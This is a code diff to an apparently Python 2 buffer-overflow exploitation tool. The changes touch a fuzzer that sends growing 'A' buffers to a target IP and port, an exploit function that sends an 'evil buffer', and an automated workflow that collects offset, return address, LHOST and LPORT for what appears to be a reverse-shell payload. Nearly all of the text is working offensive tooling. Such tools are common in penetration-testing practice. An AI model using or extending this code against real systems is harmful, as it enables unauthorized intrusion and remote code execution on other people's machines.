@@ -78,7 +78,7 @@ def copy2clip(txt):
 	return subprocess.check_call(cmd, shell=True)
 
 # Fuzzer Function
-def fuzzer_option(IP,PORT,PREFIX,ENTERS):
+def fuzzer_option(IP,PORT,PREFIX,ENTERS,POSTFIX):
 	print(cyan("\t-----------------------"))
         print(cyan("\t|       FUZZER        |"))
 	print(cyan("\t-----------------------"))
@@ -88,28 +88,49 @@ def fuzzer_option(IP,PORT,PREFIX,ENTERS):
 	print cyan("\n[+] IP : "+ IP)
 	print cyan("[+] PORT : "+ str(PORT))
 	print cyan("[+] PREFIX : \'"+ str(PREFIX) + "\'")
+	print cyan("[+] PREFIX : \'"+ str(POSTFIX) + "\'")
 	print cyan("[+] ENTERS : \'"+ str(ENTERS) + "\'\n")
 	TIMEOUT = 5
 	BUFFER = []
-	COUNTER = 100
-	while len(BUFFER) < 30:
+
+	COUNTER = 0 
+	while len(BUFFER) < 50:
 		BUFFER.append("A" * COUNTER)
 		COUNTER += 100
-	for string in BUFFER:
-		try:
-			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-			s.settimeout(TIMEOUT)
-			connect = s.connect((IP, PORT))
-			s.recv(1024)
-			print(cyan("[+] Fuzzing with %s bytes" % len(string)))
-			s.send(PREFIX + string + ENTERS)
-			s.recv(1024)
-			s.close()
+	OPTIONS = raw_input(cyan("\nDo the file got a word in starting (y/n)? :"))
+	if OPTIONS == "y":
+		for string in BUFFER:
+			try:
+				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+				s.settimeout(TIMEOUT)
+				connect = s.connect((IP, PORT))
+				s.recv(1024)
+				print(cyan("\n[+] Fuzzing with %s bytes" % len(string)))
+				TEMP = PREFIX + string + POSTFIX + ENTERS.decode('string-escape')
+				s.send(TEMP)
+				s.recv(1024)
+				s.close()
 
-		except:
-			print(red("\n[-] Could not connect to " + IP + ":" + str(PORT)))
-        		return [None,string]
-		time.sleep(1)
+			except:
+				print(red("\n[-] Could not connect to " + IP + ":" + str(PORT)))
+				return [None,string]
+			time.sleep(1)
+	else:
+		for string in BUFFER:
+			try:
+				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+				s.settimeout(TIMEOUT)
+				connect = s.connect((IP, PORT))
+				print(cyan("\n[+] Fuzzing with %s bytes" % len(string)))
+				TEMP = PREFIX + string + POSTFIX + ENTERS.decode('string-escape')
+				s.send(TEMP)
+				s.recv(1024)
+				s.close()
+
+			except:
+				print(red("\n[-] Could not connect to " + IP + ":" + str(PORT)))
+				return [None,string]
+			time.sleep(1)
 
 # Create Pattern
 def pcreate():
@@ -167,7 +188,7 @@ def exploit_option(IP,PORT,PREFIX,POSTFIX,ENTERS,OVERFLOW,RETN,PADDING,PAYLOAD,O
 		try :
 			    s.connect((IP, PORT))
 			    print("\nSending evil buffer...")
-			    s.send(BUFFER + ENTERS)
+			    s.send(BUFFER + ENTERS.decode('string-escape'))
 			    print("Trying to exploit....")
 
 		except:
@@ -323,7 +344,7 @@ def auto():
 	print "\n"
 	# FUZZER STEP
 	if OPTIONS == 'y':
-		RESULT = fuzzer_option(IP,PORT,PREFIX,ENTERS)
+		RESULT = fuzzer_option(IP,PORT,PREFIX,ENTERS,POSTFIX)
 		if len(RESULT[1]) == 100:
 			print red("\n[-] Something went wrong please check your IP or PORT!")
 			sys.exit(-1)
@@ -333,12 +354,15 @@ def auto():
 	
 	# EXPLOIT 1
 	PAYLOAD = RESULT[1][1]
+	print PAYLOAD
 	RESULT = exploit_option(IP,PORT,PREFIX,POSTFIX,ENTERS,OVERFLOW,RETN,PADDING,PAYLOAD,OFFSET)
+	print RESULT
 	
 	# CHECK OFFSET PATTERN
 	OPTIONS = raw_input(cyan("\n[+] Do you want to check offset manually (y/n)?"))
 	if OPTIONS == 'y':
 		RESULT = poffset()
+		print RESULT
 	else:
 		OFFSET = int(raw_input(cyan("\n[+] What is the Offset you found?")))
 		OVERFLOW = "A" * OFFSET
@@ -372,7 +396,7 @@ def auto():
 		OPTIONS = raw_input(cyan("\n[+] You can try in local and remotely many times from here! (y - Local, n - Remotely, x - Exit) ?"))
 		if OPTIONS == "y":
 			IP = raw_input(cyan("\n[+] What is Local Target IP? "))
-			RETN = raw_input(cyan("\n[+] What is Return Value? "))
+			RETN = raw_input(cyan("\n[+] What is Return Value? ")).decode('string-escape')
 			LHOST = raw_input(cyan("\n[+] Enter LHOST :"))
 			LPORT = raw_input(cyan("\n[+] Enter LPORT :"))
 			RESULT = payload(LHOST,LPORT,BADCHAR)
